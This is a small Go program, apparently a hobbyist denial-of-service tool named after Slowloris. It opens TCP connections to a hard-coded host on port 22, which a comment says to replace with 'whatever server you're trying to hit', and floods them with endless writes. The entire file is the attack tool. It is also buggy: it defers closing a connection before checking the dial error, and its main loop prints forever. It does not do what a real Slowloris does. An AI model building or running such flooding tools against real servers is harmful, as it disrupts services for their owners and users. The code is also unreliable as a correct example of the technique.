package main


import (
  "fmt"
  "net"
  "runtime"
	"strconv"
	"strings"
)



func main() {


  host_addr := "192.168.1.16:22" // replace this with whatever server you're trying to hit
  network := "tcp4"

  for i := 0; i < 2; i++ {

    go SlowLoris(host_addr, network, 0)


  }
  for {

    fmt.Println("Go routines ended!")
  }

}


func SlowLoris(host_addr string, network string, seconds int) {

  conn, err := net.Dial(network, host_addr)
  defer conn.Close()
  if err != nil {
    fmt.Println(err)
  }

  for {

    _, err := conn.Write([]byte("Alive..."))
    fmt.Printf("Wrote to socket in this goroutine, %d\n", goid())
    if err != nil {
      fmt.Println(err)
    }

  }
  fmt.Println("Done with goroutine.")

}


func goid() int {
	var buf [64]byte
	n := runtime.Stack(buf[:], false)
	idField := strings.Fields(strings.TrimPrefix(string(buf[:n]), "goroutine "))[0]
	id, err := strconv.Atoi(idField)
	if err != nil {
		panic(fmt.Sprintf("cannot get goroutine id: %v", err))
	}
	return id
}
